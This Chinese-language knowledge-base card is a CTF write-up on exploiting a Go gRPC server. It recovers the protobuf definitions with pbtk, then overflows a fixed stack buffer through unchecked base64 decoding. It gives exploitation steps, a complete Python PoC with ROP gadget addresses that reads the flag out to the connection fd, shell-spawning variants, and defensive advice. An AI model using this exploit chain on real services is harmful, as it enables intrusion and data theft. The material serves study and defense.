---
id: binary-pwn-stack-grpc-go-protobuf-extract-base64-fixed-buffer-orw
title: Go gRPC 服务端的 pwn：用 pbtk 从二进制还原 .proto 重建客户端，再打 base64 解码缺少长度校验的固定栈缓冲区，ROP ORW 把 flag 写到连接 fd
type: scenario
domain: binary
path: binary/pwn/stack
technique: grpc-go-protobuf-recover-client-base64-decode-stack-overflow-orw
aliases:
- pbtk 提取 proto
- grpc_tools 重建 stub
- Go gRPC 服务栈溢出
- base64 解码无长度校验溢出
- gRPC pwn 交互
- ORW 写 socket fd
tags:
- pwn
- stack-overflow
- go
- grpc
- protobuf
- base64
- rop
- orw
- ctf
- linux
cve: []
severity: high
confidence: medium
status: verified
created: '2026-05-16'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W8
  verified_at: '2026-11-09T02:37:57+08:00'
  notes: 已对照原文核对：checksec（No RELRO/No canary/NX/No PIE 0x400000）、gRPC 判型（.gopclntab 中 google.golang.org/grpc 与 protobuf 串）、pbtk 提取 .proto、grpc_tools.protoc 生成 stub、oneof 三个分支、role=3 进入 base64 解码分支、拷贝上界 3*(len>>2) 的反编译循环、0x10 正常/0x100 崩溃、偏移 0x100-0x38=0xc8、gadget 与 flag 地址、ORW 写 fd 8 均与正文一致；本次核对未读取图片，仅依据正文（IDA 截图未核）；未在本机复跑 exp，fd 号与 gadget 为题目特定值
---

## 一句话结论

当 pwn 目标是一个 Go 写的 gRPC 服务时，第一步不是找溢出点而是**先把协议找回来**：用 `pbtk` 从二进制的 protobuf 描述符里还原 `.proto`，再用 `grpc_tools.protoc` 生成可用的客户端 stub，就能像普通 socket 题一样调用每个 RPC 方法；本例 `role_change(role=3)` 会进入一个「base64 解码到固定栈缓冲区、完全按 `3*(len>>2)` 拷贝、不校验长度」的分支，填 0xc8 字节覆盖返回地址后，用二进制内的 `pop rax/rdi/rsi/rdx + syscall` gadget 拼 `open/read/write` 链把 flag 从打开的文件读到连接 fd 上。

## 原理

- **为什么必须先恢复协议**：gRPC 不走标准输入，客户端与服务端靠 HTTP/2 上的 protobuf 帧通信；不知道 `.proto` 就无法构造合法的 `Request`，连「把数据递进漏洞分支」这一步都做不到。Go 二进制把 protobuf 的 `FileDescriptorProto`（含消息名、字段名、字段号、oneof 结构、服务方法全名）以序列化字节嵌在 `.rodata`，`pbtk` 正是扫这些描述符并反编译回 `.proto`；`grpc_tools.protoc` 再据此生成 `*_pb2.py`／`*_pb2_grpc.py`，其中 `channel.unary_unary('/<package>.<Service>/<Method>', ...)` 就是服务端的真实方法路径。
- **为什么溢出成立**：漏洞分支把 gRPC 请求里的 `message` 字符串做 base64 解码后写入栈上固定缓冲区，拷贝循环的上界是解码长度 `3*(len>>2)`，与目标缓冲区容量无关。base64 每 4 字符解 3 字节，攻击者发送足够长的 base64 就能线性推进写入位置，越过缓冲区、保存的 `rbp`，直到返回地址——这是**解码长度直接当写长度**的经典错误，和 C 里的 `strcpy` 到固定数组同类。
- **为什么 Go 也能 ROP**：Go 的栈帧与调用约定（栈传参、`morestack` 检查）只影响偏移测量，CPU 仍是 x86-64；Go 静态链接、体积大，二进制里常能找到 `pop rax; ret`、`pop rdi; ret`、`pop rsi; ret`、`pop rdx; ret`、`syscall` 这些字节序列，且题目二进制通常 `No PIE`，gadget 与 `.rodata` 里 flag 路径字符串的地址都是固定值。
- **为什么输出走连接 fd 而不是 stdout**：gRPC 服务由监听线程/goroutine 处理，进程的 stdout 不指向攻击者。要拿回显有两条路：一是让 ROP 直接 `write` 到与本次连接关联的 fd（本例为 8），再用另一个 `nc` 连上同一端口读；二是先 `read` 一个 fd 上的数据（写 `/bin/sh`）再 `execve` 反弹。本文走第一条，因为 flag 路径已在 `.rodata` 里、只需 `open/read/write`。
- **为什么 `role=3` 是前置条件**：`RoleChangeRequest.role` 决定服务端选哪条处理分支，只有切到该角色后 `RepeaterRequest` 才会走进「解码并拷贝」的代码路径；这也是 `oneof` 消息设计的常见坑——同一 `Request` 里不同 oneof 分支对应完全不同的实现。

## 触发条件

- 目标为 Go 编译的 gRPC 服务端二进制，栈帧内有固定大小的缓冲区，且存在「按解码/输入长度拷贝到该缓冲区」的缺陷；
- 能从二进制中恢复 protobuf 描述符（未被裁剪且 `pbtk` 可解析），或目标开放 gRPC reflection 可直接抓 proto；
- 只有特定 RPC（本例为 `role_change` 后再发 `repeater`）才进入漏洞分支；
- 二进制未开 PIE 或存在地址泄露，且含 `pop`/`syscall` gadget（或可换 ORW/shellcode 方案）；
- 攻击者与目标 23334 端口双向可达，并能另开一条连接到该端口读取输出。

## 利用步骤

1. 判型：`checksec` 看保护（本例 No RELRO / No canary / NX / No PIE），`strings` 或 `.gopclntab` 里出现 `google.golang.org/grpc/...`、`protobuf/...` 即确认 gRPC + Go。
2. 还原协议：`pbtk` 选 step1 指向二进制，产出 `.proto`；核对 `service` 名与 method 名、`oneof` 分支的字段号（字段号决定了序列化后的 tag，不能猜）。
3. 生成客户端：`python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. xxx.proto`，得到 `*_pb2.py` 与 `*_pb2_grpc.py`；用 `insecure_channel('<ip>:<port>')` 调 `stub.Handler(...)` 验证连通（先发一个小 message 看是否原样回显）。
4. 定位分支：逐个试 `oneof` 的成员（本例 `whoami` 探活、`role_change(role=3)` 切分支、`repeater(message=...)` 进处理逻辑），用崩溃/正常回显判断哪条路径会做长度相关的解码。
5. 测偏移：发送 0x10 个 `a` 确认正常、0x100 个 `a` 触发 SIGSEGV，在 `ret` 处看到返回地址为 `0x6161616161616161`；按栈内容算出到返回地址的偏移（本例 `0x100-0x38=0xc8`）。
6. 构造链：`open('<flag path>', 0)` → `read(fd, addr, 0x100)` → `write(8, addr, 0x100)`；gadget 用二进制内固定地址，flag 路径直接用 `.rodata` 里的现成字符串地址。
7. 发送并取回显：先开一条 `nc <ip> <port>` 挂着，再通过 gRPC 发 base64 后的 payload（base64 是为了满足解码分支的输入格式）。

## PoC

```python
from base64 import b64encode
import grpc, xxx_pb2, xxx_pb2_grpc
from pwn import p64

pop_rax, pop_rdi, pop_rsi, pop_rdx = 0x4101e6, 0x401537, 0x422398, 0x461bd1
syscall, flag_str, buf = 0x40452c, 0x7ef68d, 0xC56400

p  = b'a' * 0xc8                                     # 到返回地址的偏移
p += p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(flag_str) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)
p += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(9) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(0x100) + p64(syscall)
p += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(8) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(0x100) + p64(syscall)

# 另开终端: nc <ip> <port>   —— 用于接收 fd 8 上写出的 flag
with grpc.insecure_channel('<ip>:<port>') as ch:
    stub = xxx_pb2_grpc.XXXStub(ch)
    stub.Handler(xxx_pb2.Request(role_change=xxx_pb2.RoleChangeRequest(role=3)))
    stub.Handler(xxx_pb2.Request(repeater=xxx_pb2.RepeaterRequest(message=b64encode(p).decode())))
```

说明：offset、gadget 地址与 fd 号都是题目特定值，需按目标二进制与运行环境（谁持有该连接）重新测量；`fd=9` 为 `read` 的返回值占位（`open` 成功通常返回 3 附近的 fd），若不可预测可改成 `read(rdi=3/4/5...)` 逐个尝试。

## 变体与关联

- **变体（拿不到 proto）**：若二进制描述符被裁剪，用 `grpcurl -plaintext list/describe` 试 reflection；仍不行就按 HTTP/2 帧手工构造 `POST /<服务>/<方法>` + `application/grpc` + 5 字节长度前缀的 grpc 消息体。
- **变体（无 PIE / 有 PIE）**：无 PIE 直接用固定 gadget 与 `.rodata` 字符串；有 PIE 时先找泄露点或把链改成只依赖栈上已知值的 `ret2csu` 风格。
- **变体（禁用 `open` 或想直接 shell）**：改 `read(8/0, bss, n)` 写 `/bin/sh` 再 `execve`；或 `dup2` 把连接 fd 复制到 0/1/2 后 `execve('/bin/sh')`，得到可交互 shell。
- **关联**：[[binary-pwn-stack-go-stack-overflow-rop]]（Go 栈帧偏移测量、`defer` 干扰与 syscall gadget 链的通用基础，本卡增量是 gRPC/protobuf 交互与 base64 长度缺陷）、[[code-analysis-reverse-go-binary-layout-symbol-recovery]]（Go 二进制符号与 pclntab 恢复，辅助定位 handler）。

## 检测与防御

- **代码层**：任何「解码后写入固定缓冲区」的路径都必须先比较解码长度与缓冲区容量；base64 的 `Decode` 返回值要用，不要用估算公式 `3*(len>>2)`；优先用切片/`append` 让运行时管理边界。
- **编译层**：Go 服务加 `-buildmode=pie` 并开 NX；`unsafe`/汇编/手写解析器需单独审计。
- **运行时**：监控 gRPC 服务进程的 SIGSEGV、异常返回地址、`.rodata` 中 flag 路径被 `open` 的系统调用序列；对单个连接短时间内发送超大 base64 字段的行为告警。
- **暴露面**：不要把内部 gRPC 服务直接暴露公网；对 23334 这类端口做来源白名单与协议识别（gRPC 流量突增或非标准客户端 UA 提示异常）。
